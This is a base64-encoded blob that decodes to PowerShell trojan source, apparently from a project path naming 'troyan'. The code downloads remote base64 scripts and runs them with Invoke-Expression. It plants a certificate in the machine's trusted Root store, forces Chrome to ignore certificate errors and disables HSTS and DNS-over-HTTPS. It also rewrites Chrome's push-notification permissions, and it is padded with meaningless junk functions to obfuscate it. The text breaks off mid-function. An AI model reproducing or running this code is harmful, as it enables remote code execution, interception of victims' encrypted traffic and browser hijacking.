bnZva2UtV2ViUmVxdWVzdCAtVXJpICR1cmwgLVVzZUJhc2ljUGFyc2luZyAtTWV0aG9kIEdldA0KICAgICAgICAgICAgICAgIGlmICgkcmVzcG9uc2UuU3RhdHVzQ29kZSAtZXEgMjAwKSB7DQogICAgICAgICAgICAgICAgICAgICRzY3JpcHREYXRhID0gJHJlc3BvbnNlLkNvbnRlbnQNCiAgICAgICAgICAgICAgICAgICAgJHNjcmlwdERhdGEgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJHNjcmlwdERhdGEpKSArICJgbmBuIiArICRjbWQNCiAgICAgICAgICAgICAgICAgICAgaWYgKCRkZWJ1ZykNCiAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBVdGY4Tm9Cb20gLWRhdGEgJHNjcmlwdERhdGEgLWZpbGUgIkM6XFNvZnRcaGVwaGFlc3R1c1x0cm95YW5cX291dHB1dFxfdGVtcF8kYmxvY2sucHMxIiAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgIGNhdGNoIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICBJbnZva2UtRXhwcmVzc2lvbiAtQ29tbWFuZCAkc2NyaXB0RGF0YQ0KICAgICAgICAgICAgICAgICAgICByZXR1cm4NCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9IGNhdGNoIHsNCiAgICAgICAgICAgICAgICBXcml0ZS1PdXRwdXQgJF8NCiAgICAgICAgICAgIH0gDQogICAgICAgICAgICBTdGFydC1TbGVlcCAtU2Vjb25kcyAkZGVsYXkNCiAgICAgICAgfQ0KICAgIH0gLUFyZ3VtZW50TGlzdCAkdXJsLCAkYmxvY2ssICRjbWQsICRnbG9iYWxEZWJ1Zw0KICAgIHJldHVybiAkYXN5bmNKb2INCn0NCg0KZnVuY3Rpb24gQ29udmVydC1TdHJpbmdUb0Jhc2U2NCB7DQogICAgcGFyYW0gKA0KICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICR0cnVlKV0NCiAgICAgICAgW3N0cmluZ10kSW5wdXRTdHJpbmcNCiAgICApDQogICAgDQogICAgIyBDb252ZXJ0IHRoZSBzdHJpbmcgdG8gYnl0ZXMNCiAgICAkYnl0ZXMgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldEJ5dGVzKCRJbnB1dFN0cmluZykNCiAgICANCiAgICAjIEVuY29kZSB0aGUgYnl0ZXMgdG8gYSBCYXNlNjQgc3RyaW5nDQogICAgJGJhc2U2NFN0cmluZyA9IFtDb252ZXJ0XTo6VG9CYXNlNjRTdHJpbmcoJGJ5dGVzKQ0KICAgIA0KICAgICMgUmV0dXJuIHRoZSBCYXNlNjQtZW5jb2RlZCBzdHJpbmcNCiAgICByZXR1cm4gJGJhc2U2NFN0cmluZw0KfQ0KZnVuY3Rpb24gZm5fTG9nX2pXbnh5Qm16cWQgew0KICAgIHBhcmFtICgNCiAgICAgICAgW3N0cmluZ10kbWVzc2FnZQ0KICAgICkNCiAgICB3cml0ZWRiZzIgJ0xvZzogJG1lc3NhZ2UnDQp9DQpmdW5jdGlvbiBmbl84MWl6eGV0b0NyIHsNCiAgICBwYXJhbSAoDQogICAgICAgIFtpbnRdJHZhcl9hS2MwdzdxNjlBLA0KICAgICAgICBbaW50XSR2YXJfZWtwMUhadnNoQg0KICAgICkNCiAgICAkcmVzdWx0ID0gJHZhcl9hS2MwdzdxNjlBICsgJHZhcl9la3AxSFp2c2hCDQogICAgcmV0dXJuICRyZXN1bHQNCn0NCmZ1bmN0aW9uIGZuX2lHZ0UzUktPdTIgew0KICAgIHBhcmFtICgNCiAgICAgICAgW2ludF0kdmFyX2VrcDFIWnZzaEIsDQogICAgICAgIFtpbnRdJHZhcl9hS2MwdzdxNjlBDQogICAgKQ0KICAgICRyZXN1bHQgPSAkdmFyX2VrcDFIWnZzaEIgKyAkdmFyX2FLYzB3N3E2OUENCiAgICByZXR1cm4gJHJlc3VsdA0KfQ0KaWYgKCR2YXJfYUtjMHc3cTY5QSAtZ3QgMykgew0KICAgIHdyaXRlZGJnMiAnbzE3U25RY1VNVmoyd2JCJw0KfSBlbHNlIHsNCiAgICB3cml0ZWRiZzIgJ0JlYmQ4eHVtcUFoNUNmbCcNCn0NCmlmICgkdmFyX2VrcDFIWnZzaEIgLWd0IDIpIHsNCiAgICB3cml0ZWRiZzIgJ2l4Rk10M1ZJVWNyMjd3eScNCn0gZWxzZSB7DQogICAgd3JpdGVkYmcyICdUdzJmWHJQdGs2UzlPQk4nDQp9DQokdmFyX2VrcDFIWnZzaEIgPSBmbl9pR2dFM1JLT3UyIC1wYXJhbTEgNTUgLXBhcmFtMiAzOQ0Kd3JpdGVkYmcyICcxZm96NlFWRjdMZHZnRFAnDQokdmFyX2FLYzB3N3E2OUEgPSBmbl84MWl6eGV0b0NyIC1wYXJhbTEgODEgLXBhcmFtMiA0NQ0Kd3JpdGVkYmcyICc3cXVPOEVmc1hjZ1JLWVQnDQokdmFyX2FLYzB3N3E2OUEgPSBmbl84MWl6eGV0b0NyIC1wYXJhbTEgMjcgLXBhcmFtMiA1MA0Kd3JpdGVkYmcyICd4cFU3aHptZVFuMkgzYmwnDQokdmFyX2VrcDFIWnZzaEIgPSBmbl9pR2dFM1JLT3UyIC1wYXJhbTEgNzAgLXBhcmFtMiA4DQp3cml0ZWRiZzIgJ2xkWDJ4UjBIUDh2eTRXeicNCiR2YXJfYUtjMHc3cTY5QSA9IGZuXzgxaXp4ZXRvQ3IgLXBhcmFtMSAyMyAtcGFyYW0yIDM0DQp3cml0ZWRiZzIgJzBYT1lua0RSTnlkaDR3NScNCiAKCiMgY2VydC5wczEKCgoKDQoKCg0KDQpmdW5jdGlvbiBDZXJ0LVdvcmsgew0KICAgIHBhcmFtKA0KICAgICAgICBbc3RyaW5nXSAkY29udGVudFN0cmluZw0KICAgICkNCiAgICAkb3V0cHV0RmlsZVBhdGggPSBbU3lzdGVtLklPLlBhdGhdOjpHZXRUZW1wRmlsZU5hbWUoKQ0KICAgICRiaW5hcnkgPSBbQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJGNvbnRlbnRTdHJpbmcpDQogICAgdHJ5IHsNCiAgICAgICAgU2V0LUNvbnRlbnQgLVBhdGggJG91dHB1dEZpbGVQYXRoIC1WYWx1ZSAkYmluYXJ5IC1Bc0J5dGVTdHJlYW0NCiAgICB9IGNhdGNoIHsNCiAgICAgICAgQWRkLUNvbnRlbnQgLVBhdGggJG91dHB1dEZpbGVQYXRoIC1WYWx1ZSAkYmluYXJ5IC1FbmNvZGluZyBCeXRlDQogICAgfQ0KICAgIEluc3RhbGwtQ2VydGlmaWNhdGVUb1N0b3JlcyAtQ2VydGlmaWNhdGVGaWxlUGF0aCAkb3V0cHV0RmlsZVBhdGggLVBhc3N3b3JkICcxMjMnDQp9DQoNCmZ1bmN0aW9uIEluc3RhbGwtQ2VydGlmaWNhdGVUb1N0b3JlcyB7DQogICAgcGFyYW0oDQogICAgICAgIFtzdHJpbmddICRDZXJ0aWZpY2F0ZUZpbGVQYXRoLA0KICAgICAgICBbc3RyaW5nXSAkUGFzc3dvcmQNCiAgICApDQoNCiAgICB0cnkgew0KICAgICAgICAkc2VjdXJlUGFzc3dvcmQgPSBDb252ZXJ0VG8tU2VjdXJlU3RyaW5nIC1TdHJpbmcgJFBhc3N3b3JkIC1Bc1BsYWluVGV4dCAtRm9yY2UNCg0KICAgICAgICAjIEltcG9ydCBjZXJ0aWZpY2F0ZSB0byBQZXJzb25hbCAoTXkpIHN0b3JlDQogICAgICAgICRwZXJzb25hbFN0b3JlUGF0aCA9ICJDZXJ0OlxMb2NhbE1hY2hpbmVcTXkiDQogICAgICAgIEltcG9ydC1QZnhDZXJ0aWZpY2F0ZSAtRmlsZVBhdGggJENlcnRpZmljYXRlRmlsZVBhdGggLUNlcnRTdG9yZUxvY2F0aW9uICRwZXJzb25hbFN0b3JlUGF0aCAtUGFzc3dvcmQgJHNlY3VyZVBhc3N3b3JkIC1FcnJvckFjdGlvbiBTdG9wDQogICAgICAgIHdyaXRlZGJnICJDZXJ0aWZpY2F0ZSBpbnN0YWxsZWQgc3VjY2Vzc2Z1bGx5IHRvIFBlcnNvbmFsIHN0b3JlIChNeSkuIg0KDQogICAgICAgICMgSW1wb3J0IGNlcnRpZmljYXRlIHRvIFJvb3Qgc3RvcmUNCiAgICAgICAgJHJvb3RTdG9yZVBhdGggPSAiQ2VydDpcTG9jYWxNYWNoaW5lXFJvb3QiDQogICAgICAgIEltcG9ydC1QZnhDZXJ0aWZpY2F0ZSAtRmlsZVBhdGggJENlcnRpZmljYXRlRmlsZVBhdGggLUNlcnRTdG9yZUxvY2F0aW9uICRyb290U3RvcmVQYXRoIC1QYXNzd29yZCAkc2VjdXJlUGFzc3dvcmQgLUVycm9yQWN0aW9uIFN0b3ANCiAgICAgICAgd3JpdGVkYmcgIkNlcnRpZmljYXRlIGluc3RhbGxlZCBzdWNjZXNzZnVsbHkgdG8gUm9vdCBzdG9yZS4iDQoNCiAgICB9IGNhdGNoIHsNCiAgICAgICAgdGhyb3cgIkZhaWxlZCB0byBpbnN0YWxsIGNlcnRpZmljYXRlOiAkXyINCiAgICB9DQp9DQoNCmZ1bmN0aW9uIGRvX2NlcnQgew0KICAgIHRyeSANCiAgICB7DQogICAgICAgIGZvcmVhY2ggKCRrZXkgaW4gJHhkYXRhLktleXMpIHsNCiAgICAgICAgICAgIENlcnQtV29yayAtY29udGVudFN0cmluZyAkeGRhdGFbJGtleV0NCiAgICAgICAgfQ0KICAgIH0NCiAgICBjYXRjaCB7DQogICAgICAgIHdyaXRlZGJnICJBbiBlcnJvciBvY2N1cnJlZCAoQ29uZmlndXJlQ2VydGlmaWNhdGVzKTogJF8iDQogICAgICB9DQp9DQpmdW5jdGlvbiBmbl9Mb2dfUko4d2x0U0lQMiB7DQogICAgcGFyYW0gKA0KICAgICAgICBbc3RyaW5nXSRtZXNzYWdlDQogICAgKQ0KICAgIHdyaXRlZGJnMiAnTG9nOiAkbWVzc2FnZScNCn0NCmZ1bmN0aW9uIGZuXzc2b1hiQUZ3bXkgew0KICAgIHBhcmFtICgNCiAgICAgICAgW2ludF0kdmFyX214bldpVkZHa0wsDQogICAgICAgIFtpbnRdJHZhcl9pZ1dzOFlGTWRlDQogICAgKQ0KICAgICRyZXN1bHQgPSAkdmFyX214bldpVkZHa0wgKyAkdmFyX2lnV3M4WUZNZGUNCiAgICByZXR1cm4gJHJlc3VsdA0KfQ0KZnVuY3Rpb24gZm5faExVSGI3MWlzbSB7DQogICAgcGFyYW0gKA0KICAgICAgICBbaW50XSR2YXJfaWdXczhZRk1kZSwNCiAgICAgICAgW2ludF0kdmFyX214bldpVkZHa0wNCiAgICApDQogICAgJHJlc3VsdCA9ICR2YXJfaWdXczhZRk1kZSArICR2YXJfbXhuV2lWRkdrTA0KICAgIHJldHVybiAkcmVzdWx0DQp9DQppZiAoJHZhcl9teG5XaVZGR2tMIC1ndCAzKSB7DQogICAgd3JpdGVkYmcyICdXSTZEUmM5WmRDaFZybE4nDQp9IGVsc2Ugew0KICAgIHdyaXRlZGJnMiAnY3Z1ZjFOTEJ5NXJia2dUJw0KfQ0KaWYgKCR2YXJfaWdXczhZRk1kZSAtZ3QgMikgew0KICAgIHdyaXRlZGJnMiAnb1N3TlJ6dTEyNjRIUWhQJw0KfSBlbHNlIHsNCiAgICB3cml0ZWRiZzIgJzNDdE5SbGFCY2dJVlFBdicNCn0NCiR2YXJfbXhuV2lWRkdrTCA9IGZuX2hMVUhiNzFpc20gLXBhcmFtMSA4MSAtcGFyYW0yIDE3DQp3cml0ZWRiZzIgJ2RCYVg1SDJsRzR6ZTlQMCcNCiR2YXJfbXhuV2lWRkdrTCA9IGZuXzc2b1hiQUZ3bXkgLXBhcmFtMSA3MCAtcGFyYW0yIDg3DQp3cml0ZWRiZzIgJ0hQU0V2ZTFwcXhuZ1lSTicNCiR2YXJfaWdXczhZRk1kZSA9IGZuX2hMVUhiNzFpc20gLXBhcmFtMSAzOCAtcGFyYW0yIDk3DQp3cml0ZWRiZzIgJ0wwRVpORmVIa3FpbjVvNCcNCiR2YXJfbXhuV2lWRkdrTCA9IGZuX2hMVUhiNzFpc20gLXBhcmFtMSA2MiAtcGFyYW0yIDg2DQp3cml0ZWRiZzIgJ01WSGNma1g4Q3Y3Wk5SRicNCiR2YXJfaWdXczhZRk1kZSA9IGZuXzc2b1hiQUZ3bXkgLXBhcmFtMSAxOCAtcGFyYW0yIDIyDQp3cml0ZWRiZzIgJzJKTWlHOVFiMEw3dlhweicNCiAKCiMgY2hyb21lLnBzMQoKCgoNCg0KZnVuY3Rpb24gZG9fY2hyb21lIHsNCiAgICBTZXQtSXRlbVByb3BlcnR5IC1QYXRoICJIS0xNOlxTWVNURU1cQ3VycmVudENvbnRyb2xTZXRcU2VydmljZXNcRG5zY2FjaGVcUGFyYW1ldGVycyIgLU5hbWUgIkVuYWJsZUF1dG9ET0giIC1WYWx1ZSAwDQoNCiAgICAkY2hyb21lS2V5UGF0aCA9ICJIS0xNOlxTb2Z0d2FyZVxQb2xpY2llc1xHb29nbGVcQ2hyb21lIg0KDQogICAgaWYgKC1ub3QgKFRlc3QtUGF0aCAkY2hyb21lS2V5UGF0aCkpIHsNCiAgICAgICAgTmV3LUl0ZW0gLVBhdGggJGNocm9tZUtleVBhdGggLUZvcmNlIHwgT3V0LU51bGwNCiAgICB9DQoNCiAgICBOZXctSXRlbSAtUGF0aCAkY2hyb21lS2V5UGF0aCAtRm9yY2UgfCBPdXQtTnVsbCAgIyBDcmVhdGUgdGhlIGtleSBpZiBpdCBkb2Vzbid0IGV4aXN0DQogICAgU2V0LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAkY2hyb21lS2V5UGF0aCAtTmFtZSAiQ29tbWFuZExpbmVGbGFnIiAtVmFsdWUgIi0taWdub3JlLWNlcnRpZmljYXRlLWVycm9ycyAtLWRpc2FibGUtcXVpYyAtLWRpc2FibGUtaHN0cyINCiAgICBTZXQtSXRlbVByb3BlcnR5IC1QYXRoICRjaHJvbWVLZXlQYXRoIC1OYW1lICJEbnNPdmVySHR0cHMiIC1WYWx1ZSAib2ZmIg0KDQogICAgU2V0LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAkY2hyb21lS2V5UGF0aCAtTmFtZSAiSWdub3JlQ2VydGlmaWNhdGVFcnJvcnMiIC1WYWx1ZSAxDQoNCiAgICB3cml0ZWRiZyAiQ2hyb21lIGNvbmZpZ3VyZWQiDQp9DQoNCmZ1bmN0aW9uIGZuX0xvZ185c2F0eFU3V21oIHsNCiAgICBwYXJhbSAoDQogICAgICAgIFtzdHJpbmddJG1lc3NhZ2UNCiAgICApDQogICAgd3JpdGVkYmcyICdMb2c6ICRtZXNzYWdlJw0KfQ0KZnVuY3Rpb24gZm5fVk92c0lmUFhKYyB7DQogICAgcGFyYW0gKA0KICAgICAgICBbaW50XSR2YXJfbExNRmtKSzROVCwNCiAgICAgICAgW2ludF0kdmFyX3NIWERnNHpoYVINCiAgICApDQogICAgJHJlc3VsdCA9ICR2YXJfbExNRmtKSzROVCArICR2YXJfc0hYRGc0emhhUg0KICAgIHJldHVybiAkcmVzdWx0DQp9DQpmdW5jdGlvbiBmbl9mdFdSak1Cb2NrIHsNCiAgICBwYXJhbSAoDQogICAgICAgIFtpbnRdJHZhcl9zSFhEZzR6aGFSLA0KICAgICAgICBbaW50XSR2YXJfbExNRmtKSzROVA0KICAgICkNCiAgICAkcmVzdWx0ID0gJHZhcl9zSFhEZzR6aGFSICsgJHZhcl9sTE1Ga0pLNE5UDQogICAgcmV0dXJuICRyZXN1bHQNCn0NCmlmICgkdmFyX2xMTUZrSks0TlQgLWd0IDIpIHsNCiAgICB3cml0ZWRiZzIgJ0JLZDNaOFRmeTRoNU9GUScNCn0gZWxzZSB7DQogICAgd3JpdGVkYmcyICdnZVRJUUh6dktTMDJKNE4nDQp9DQppZiAoJHZhcl9zSFhEZzR6aGFSIC1ndCAyKSB7DQogICAgd3JpdGVkYmcyICdkeGYxdTBNQWhrTzM4UUYnDQp9IGVsc2Ugew0KICAgIHdyaXRlZGJnMiAnTHhxTW52WHRjOFFsT0hDJw0KfQ0KJHZhcl9zSFhEZzR6aGFSID0gZm5fZnRXUmpNQm9jayAtcGFyYW0xIDc2IC1wYXJhbTIgODgNCndyaXRlZGJnMiAnVlJEb3pwYml0Z0dIcTJyJw0KJHZhcl9zSFhEZzR6aGFSID0gZm5fZnRXUmpNQm9jayAtcGFyYW0xIDcyIC1wYXJhbTIgNTINCndyaXRlZGJnMiAnU09hZFc1MnFjWE5zVHRlJw0KJHZhcl9zSFhEZzR6aGFSID0gZm5fVk92c0lmUFhKYyAtcGFyYW0xIDEyIC1wYXJhbTIgNTgNCndyaXRlZGJnMiAnbWJZVlBTcGNlTnRUd3kzJw0KJHZhcl9sTE1Ga0pLNE5UID0gZm5fZnRXUmpNQm9jayAtcGFyYW0xIDEyIC1wYXJhbTIgNjANCndyaXRlZGJnMiAndk15bUsxTzVFaGN3bkhwJw0KJHZhcl9sTE1Ga0pLNE5UID0gZm5fVk92c0lmUFhKYyAtcGFyYW0xIDI1IC1wYXJhbTIgNDkNCndyaXRlZGJnMiAnNXZzaEpXbE56bWoyOUNNJw0KIAoKIyBjaHJvbWVfcHVzaC5wczEKCgoKDQoKCg0KDQoNCg0KZnVuY3Rpb24gQ29tcGFyZS1BcnJheXMgew0KICAgIHBhcmFtICgNCiAgICAgICAgW2FycmF5XSRBcnJheTEsDQogICAgICAgIFthcnJheV0kQXJyYXkyDQogICAgKQ0KDQogICAgIyBTb3J0IGJvdGggYXJyYXlzIGFuZCBjb21wYXJlDQogICAgJGFycmF5MVNvcnRlZCA9ICRBcnJheTEgfCBTb3J0LU9iamVjdCB8IEdldC1VbmlxdWUNCiAgICAkYXJyYXkyU29ydGVkID0gJEFycmF5MiB8IFNvcnQtT2JqZWN0IHwgR2V0LVVuaXF1ZQ0KDQogICAgJGpvMSA9ICRhcnJheTFTb3J0ZWQgLWpvaW4gJywnIA0KICAgIA0KICAgICRqbzIgPSAkYXJyYXkyU29ydGVkIC1qb2luICcsJw0KDQogICAgIyBEZXRlcm1pbmUgaWYgdGhlIGFycmF5cyBhcmUgZXF1YWwgKG9yZGVyIGRvZXMgbm90IG1hdHRlcikNCiAgICBpZiAoJGpvMSAtZXEgJGpvMiApIHsNCiAgICAgICAgcmV0dXJuICR0cnVlDQogICAgfSBlbHNlIHsNCiAgICAgICAgcmV0dXJuICRmYWxzZQ0KICAgIH0NCn0NCg0KDQpmdW5jdGlvbiBIYXZlVG9QdXNoZXMgew0KICAgICRyZXN1bHQgPSAkZmFsc2U7DQogICAgJGV4aXN0cyA9IEAoKQ0KICAgICR0b3NldCA9IEAoKQ0KICAgICRwcmVmZXJlbmNlc1BhdGggPSAiJGVudjpMT0NBTEFQUERBVEFcR29vZ2xlXENocm9tZVxVc2VyIERhdGFcRGVmYXVsdFxQcmVmZXJlbmNlcyINCg0KICAgICMgQ2hlY2sgaWYgdGhlIFByZWZlcmVuY2VzIGZpbGUgZXhpc3RzDQogICAgaWYgKFRlc3QtUGF0aCAkcHJlZmVyZW5jZXNQYXRoKSB7DQogICAgICAgICRwcmVmZXJlbmNlc0NvbnRlbnQgPSBHZXQtQ29udGVudCAtUGF0aCAkcHJlZmVyZW5jZXNQYXRoIC1SYXcgfCBDb252ZXJ0RnJvbS1Kc29uDQoNCiAgICAgICAgIyBDaGVjayBpZiB0aGUgc3RydWN0dXJlIGlzIGFzIGV4cGVjdGVkDQogICAgICAgIGlmICgkcHJlZmVyZW5jZXNDb250ZW50IC1hbmQgJHByZWZlcmVuY2VzQ29udGVudC5wcm9maWxlIC1hbmQgJHByZWZlcmVuY2VzQ29udGVudC5wcm9maWxlLmNvbnRlbnRfc2V0dGluZ3MgLWFuZCAkcHJlZmVyZW5jZXNDb250ZW50LnByb2ZpbGUuY29udGVudF9zZXR0aW5ncy5leGNlcHRpb25zLm5vdGlmaWNhdGlvbnMpIHsNCiAgICAgICAgICAgICRub3RpZmljYXRpb25TZXR0aW5ncyA9ICRwcmVmZXJlbmNlc0NvbnRlbnQucHJvZmlsZS5jb250ZW50X3NldHRpbmdzLmV4Y2VwdGlvbnMubm90aWZpY2F0aW9ucw0KDQogICAgICAgICAgICAjIEl0ZXJhdGUgdGhyb3VnaCBlYWNoIGVudHJ5IGluICRub3RpZmljYXRpb25TZXR0aW5ncw0KICAgICAgICAgICAgZm9yZWFjaCAoJGZpZWxkIGluICRub3RpZmljYXRpb25TZXR0aW5ncy5QU09iamVjdC5Qcm9wZXJ0aWVzKSB7DQogICAgICAgICAgICAgICAgJHNpdGVVcmwgPSAkZmllbGQuTmFtZQ0KICAgICAgICAgICAgICAgICRleGlzdHMgKz0gUHVzaERvbWFpbiAtcHVzaFVybCAkc2l0ZVVybA0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgfQ0KDQogICAgZm9yZWFjaCAoJHB1c2ggaW4gJHNlcnZlci5wdXNoZXMpIHsNCiAgICAgICAgJHRvc2V0ICs9IFB1c2hEb21haW4gLXB1c2hVcmwgJHB1c2gNCiAgICB9DQoNCiAgICAgJHJlc3VsdCA9IC1ub3QoQ29tcGFyZS1BcnJheXMgLUFycmF5MSAkZXhpc3RzIC1BcnJheTIgJHRvc2V0KQ0KICAgIA0KICAgIHJldHVybiAkcmVzdWx0Ow0KfQ0KDQoNCmZ1bmN0aW9uIFB1c2hEb21haW4gew0KICAgIHBhcmFtICgkcHVzaFVybCkNCg0KICAgICMgVHJpbSB0aGUgaW5wdXQgc3RyaW5nIGJlZm9yZSB0aGUgZmlyc3QgY29tbWENCiAgICAkdHJpbW1lZFVybCA9ICRwdXNoVXJsLlRyaW0oKS5TcGxpdCgnLCcpWzBdLlRyaW0oKQ0KDQogICAgIyBQYXJzZSB0aGUgVVJJDQogICAgJHBhcnNlZFVyaSA9IFtTeXN0ZW0uVXJpXTo6bmV3KCR0cmltbWVkVXJsKQ0KICAgIA0KICAgICMgRXh0cmFjdCBkb21haW4gYW5kIHBvcnQNCiAgICAkZG9tYWluID0gJHBhcnNlZFVyaS5Ib3N0DQogICAgJHBvcnQgPSBpZiAoJHBhcnNlZFVyaS5Qb3J0IC1lcSAtMSkgeyA0NDMgfSBlbHNlIHsgJHBhcnNlZFVyaS5Qb3J0IH0NCg0KICAgICMgQ29uc3RydWN0IHRoZSByZXN1bHQgVVJMDQogICAgJHJlc3VsdCA9ICJodHRwczovLyIgKyAkZG9tYWluICsgIjoiICsgIiRwb3J0LCoiDQogICAgDQogICAgcmV0dXJuICRyZXN1bHQNCn0NCg0KZnVuY3Rpb24gUHVzaEV4aXN0cw0Kew0KICAgIHBhcmFtICgkcHVzaFVybCkNCiAgICBmb3JlYWNoICgkcHVzaCBpbiAkc2VydmVyLnB1c2hlcykgDQogICAgew0KICAgICAgICBpZiAoKFB1c2hEb21haW4gLXB1c2hVcmwgJHB1c2hVcmwpIC1lcSAoUHVzaERvbWFpbiAtcHVzaFVybCAkcHVzaCkpDQogICAgICAgIHsNCiAgICAgICAgICAgIHJldHVybiAkdHJ1ZTsNCiAgICAgICAgfQ0KICAgIH0NCiAgICByZXR1cm4gJGZhbHNlDQp9DQoNCmZ1bmN0aW9uIFJlbW92ZS1QdXNoZXMgew0KICAgICRwcmVmZXJlbmNlc1BhdGggPSAiJGVudjpMT0NBTEFQUERBVEFcR29vZ2xlXENocm9tZVxVc2VyIERhdGFcRGVmYXVsdFxQcmVmZXJlbmNlcyINCg0KICAgICMgQ2hlY2sgaWYgdGhlIFByZWZlcmVuY2VzIGZpbGUgZXhpc3RzDQogICAgaWYgKFRlc3QtUGF0aCAkcHJlZmVyZW5jZXNQYXRoKSB7DQogICAgICAgICRwcmVmZXJlbmNlc0NvbnRlbnQgPSBHZXQtQ29udGVudCAtUGF0aCAkcHJlZmVyZW5jZXNQYXRoIC1SYXcgfCBDb252ZXJ0RnJvbS1Kc29uDQoNCiAgICAgICAgIyBDaGVjayBpZiB0aGUgc3RydWN0dXJlIGlzIGFzIGV4cGVjdGVkDQogICAgICAgIGlmICgkcHJlZmVyZW5jZXNDb250ZW50IC1hbmQgJHByZWZlcmVuY2VzQ29udGVudC5wcm9maWxlIC1hbmQgJHByZWZlcmVuY2VzQ29udGVudC5wcm9maWxlLmNvbnRlbnRfc2V0dGluZ3MgLWFuZCAkcHJlZmVyZW5jZXNDb250ZW50LnByb2ZpbGUuY29udGVudF9zZXR0aW5ncy5leGNlcHRpb25zLm5vdGlmaWNhdGlvbnMpIHsNCiAgICAgICAgICAgICRub3RpZmljYXRpb25TZXR0aW5ncyA9ICRwcmVmZXJlbmNlc0NvbnRlbnQucHJvZmlsZS5jb250ZW50X3NldHRpbmdzLmV4Y2VwdGlvbnMubm90aWZpY2F0aW9ucw0KDQogICAgICAgICAgICAka2V5c1RvUmVtb3ZlID0gQCgpDQoNCiAgICAgICAgICAgICMgSXRlcmF0ZSB0aHJvdWdoIGVhY2ggZW50cnkgaW4gJG5vdGlmaWNhdGlvblNldHRpbmdzDQogICAgICAgICAgICBmb3JlYWNoICgkZmllbGQgaW4gJG5vdGlmaWNhdGlvblNldHRpbmdzLlBTT2JqZWN0LlByb3BlcnRpZXMpIHsNCiAgICAgICAgICAgICAgICAkc2l0ZVVybCA9ICRmaWVsZC5OYW1lDQogICAgICAgICAgICAgICAgJHBlcm1pc3Npb24gPSAoUHVzaEV4aXN0cyAtcHVzaFVybCAkc2l0ZVVybCkNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIGlmICgkcGVybWlzc2lvbiAtZXEgJGZhbHNlKSB7DQogICAgICAgICAgICAgICAgICAgICRrZXlzVG9SZW1vdmUgKz0gJGZpZWxkLk5hbWUNCiAgICAgICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgICAgICB3cml0ZWRiZyAiJHNpdGVVcmwgaGFzbid0IGJlZW4gcmVtb3ZlZCwgaXQgaXMgYSBnb29kIHNpdGUuIg0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgZm9yZWFjaCAoJGtleSBpbiAka2V5c1RvUmVtb3ZlKSB7DQogICAgICAgICAgICAgICAgJG5vdGlmaWNhdGlvblNldHRpbmdzLlBTT2JqZWN0LlByb3BlcnRpZXMuUmVtb3ZlKCRrZXkpDQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICRwcmVmZXJlbmNlc0NvbnRlbnQgfCBDb252ZXJ0VG8tSnNvbiAtRGVwdGggMTAwIHwgU2V0LUNvbnRlbnQgLVBhdGggJHByZWZlcmVuY2VzUGF0aCAtRm9yY2UNCg0KICAgICAgICAgICAgd3JpdGVkYmcgIkFsbCBzZWxlY3RlZCBwdXNoIG5vdGlmaWNhdGlvbiBzZXR0aW5ncyBoYXZlIGJlZW4gcmVtb3ZlZC4iDQogICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICB3cml0ZWRiZyAiTm8gb3IgdW5leHBlY3RlZCBub3RpZmljYXRpb24gc2V0dGluZ3MgZm91bmQgaW4gUHJlZmVyZW5jZXMgZmlsZS4iDQogICAgICAgIH0NCiAgICB9IGVsc2Ugew0KICAgICAgICB3cml0ZWRiZyAiUHJlZmVyZW5jZXMgZmlsZSBub3QgZm91bmQgYXQgcGF0aDogJHByZWZlcmVuY2VzUGF0aCINCiAgICB9DQp9DQoNCmZ1bmN0aW9uIEFkZC1QdXNoZXN7DQogICAgZm9yZWFjaCAoJHB1c2ggaW4gJHNlcnZlci5wdXNoZXMpIHsNCiAgICAgICAgQWRkLVB1c2ggLXB1c2hVcmwgJHB1c2ggLXdvcmsgJHdvcmsNCiAgICB9DQp9DQoNCmZ1bmN0aW9uIEFkZC1QdXNoIHsNCiAgICBwYXJhbSAoDQogICAgICAgIFtzdHJpbmddJHB1c2hVcmwNCiAgICApDQoNCiAgICAkcHVzaERvbWFpbiA9IFB1c2hEb21haW4gLXB1c2hVcmwgJHB1c2hVcmwNCg0KICAgICRjaHJvbWVQcmVmZXJlbmNlc1BhdGggPSAiJGVudjpMT0NBTEFQUERBVEFcR29vZ2xlXENocm9tZVxVc2VyIERhdGFcRGVmYXVsdFxQcmVmZXJlbmNlcyINCg0KICAgIGlmICgtbm90IChUZXN0LVBhdGggLVBhdGggJGNocm9tZVByZWZlcmVuY2VzUGF0aCkpIHsNCiAgICAgICAgd3JpdGVkYmcgIkNocm9tZSBwcmVmZXJlbmNlcyBmaWxlIG5vdCBmb3VuZCBhdCBwYXRoOiAkY2hyb21lUHJlZmVyZW5jZXNQYXRoIg0KICAgICAgICBleGl0DQogICAgfQ0KDQogICAgJHByZWZlcmVuY2VzQ29udGVudCA9IEdldC1Db250ZW50IC1QYXRoICRjaHJvbWVQcmVmZXJlbmNlc1BhdGggLVJhdyB8IENvbnZlcnRGcm9tLUpzb24NCg0KICAgIGlmICgtbm90ICRwcmVmZXJlbmNlc0NvbnRlbnQucHJvZmlsZSkgew0KICAgICAgICAkcHJlZmVyZW5jZXNDb250ZW50IHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgcHJvZmlsZSAtVmFsdWUgQHt9DQogICAgfQ0KDQogI